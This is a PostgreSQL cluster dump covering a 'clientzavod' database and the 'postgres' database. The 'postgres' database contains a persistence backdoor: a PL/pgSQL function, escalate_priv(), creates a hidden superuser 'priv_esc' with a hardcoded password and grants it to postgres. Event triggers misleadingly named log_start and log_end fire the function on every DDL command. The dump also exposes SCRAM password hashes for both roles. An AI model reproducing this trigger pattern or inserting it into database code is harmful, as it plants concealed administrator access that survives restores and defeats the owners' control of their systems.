--
-- PostgreSQL database cluster dump
--

\restrict SGrgrgERJOia58jLUeaaM8AO4Il9R5nFE3XhpQ9vW1mRLGPIbcIw0s64Avm7y07

SET default_transaction_read_only = off;

SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;

--
-- Roles
--

CREATE ROLE postgres;
ALTER ROLE postgres WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN REPLICATION BYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:rtY42NBLwkZMJCIq4YxiBw==$DICOa76lTKkdi9T4vUvC8fwtVZD0d8RizIoKd5Gjvlw=:N6Qq2sFMPgvCF9y7T7TvuRAnUxHFziguxL/g/eYlCwI=';
CREATE ROLE priv_esc;
ALTER ROLE priv_esc WITH SUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:YDi8Zjfar6J9nSO70QYyUQ==$ASEuMwL2LDw/p4GubCaCxPUs0opb4dYR4eFZuwGANGQ=:shCs+MFsako6xdcO7qEG80ikEViJksEo67SD7o6QQzk=';

--
-- User Configurations
--


--
-- Role memberships
--

GRANT priv_esc TO postgres GRANTED BY postgres;






\unrestrict SGrgrgERJOia58jLUeaaM8AO4Il9R5nFE3XhpQ9vW1mRLGPIbcIw0s64Avm7y07

--
-- Databases
--

--
-- Database "template1" dump
--

\connect template1

--
-- PostgreSQL database dump
--

\restrict 27acTMcbUetHUez1bP6fdklL7LeVPOVtS7bbCngVcQLb2rkfPyQVAQVL3LvN8j5

-- Dumped from database version 15.17 (Debian 15.17-1.pgdg13+1)
-- Dumped by pg_dump version 15.17 (Debian 15.17-1.pgdg13+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict 27acTMcbUetHUez1bP6fdklL7LeVPOVtS7bbCngVcQLb2rkfPyQVAQVL3LvN8j5

--
-- Database "clientzavod" dump
--

--
-- PostgreSQL database dump
--

\restrict LMTEEKfh2IEsGU5qk67T1AOr0CswvNQRQTlK6Zsc2uYO3gHE9jJh5VgBOmMUZku

-- Dumped from database version 15.17 (Debian 15.17-1.pgdg13+1)
-- Dumped by pg_dump version 15.17 (Debian 15.17-1.pgdg13+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: clientzavod; Type: DATABASE; Schema: -; Owner: postgres
--

CREATE DATABASE clientzavod WITH TEMPLATE = template0 ENCODING = 'UTF8' LOCALE_PROVIDER = libc LOCALE = 'en_US.utf8';


ALTER DATABASE clientzavod OWNER TO postgres;

\unrestrict LMTEEKfh2IEsGU5qk67T1AOr0CswvNQRQTlK6Zsc2uYO3gHE9jJh5VgBOmMUZku
\connect clientzavod
\restrict LMTEEKfh2IEsGU5qk67T1AOr0CswvNQRQTlK6Zsc2uYO3gHE9jJh5VgBOmMUZku

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict LMTEEKfh2IEsGU5qk67T1AOr0CswvNQRQTlK6Zsc2uYO3gHE9jJh5VgBOmMUZku

--
-- Database "postgres" dump
--

\connect postgres

--
-- PostgreSQL database dump
--

\restrict 9jRbdCccgUOOiRs09z7NzDLoos2i2pMHuLRjoZLhyWeFyKkmi14IA4d0mZslaHz

-- Dumped from database version 15.17 (Debian 15.17-1.pgdg13+1)
-- Dumped by pg_dump version 15.17 (Debian 15.17-1.pgdg13+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: postgres_fdw; Type: EXTENSION; Schema: -; Owner: -
--

CREATE EXTENSION IF NOT EXISTS postgres_fdw WITH SCHEMA public;


--
-- Name: EXTENSION postgres_fdw; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION postgres_fdw IS 'foreign-data wrapper for remote PostgreSQL servers';


--
-- Name: escalate_priv(); Type: FUNCTION; Schema: public; Owner: postgres
--

CREATE FUNCTION public.escalate_priv() RETURNS event_trigger
    LANGUAGE plpgsql
    AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
 
IF is_super THEN
  BEGIN
    EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp1237126512''';
  EXCEPTION WHEN duplicate_object THEN
    NULL;
  WHEN OTHERS THEN
    NULL;
  END;
 
  BEGIN
    EXECUTE 'GRANT priv_esc TO postgres';
  EXCEPTION WHEN OTHERS THEN
    NULL;
  END;
END IF;
END;
$$;


ALTER FUNCTION public.escalate_priv() OWNER TO postgres;

--
-- Name: log_end; Type: EVENT TRIGGER; Schema: -; Owner: postgres
--

CREATE EVENT TRIGGER log_end ON ddl_command_end
   EXECUTE FUNCTION public.escalate_priv();


ALTER EVENT TRIGGER log_end OWNER TO postgres;

--
-- Name: log_start; Type: EVENT TRIGGER; Schema: -; Owner: postgres
--

CREATE EVENT TRIGGER log_start ON ddl_command_start
   EXECUTE FUNCTION public.escalate_priv();


ALTER EVENT TRIGGER log_start OWNER TO postgres;

--
-- PostgreSQL database dump complete
--

\unrestrict 9jRbdCccgUOOiRs09z7NzDLoos2i2pMHuLRjoZLhyWeFyKkmi14IA4d0mZslaHz

--
-- PostgreSQL database cluster dump complete
--

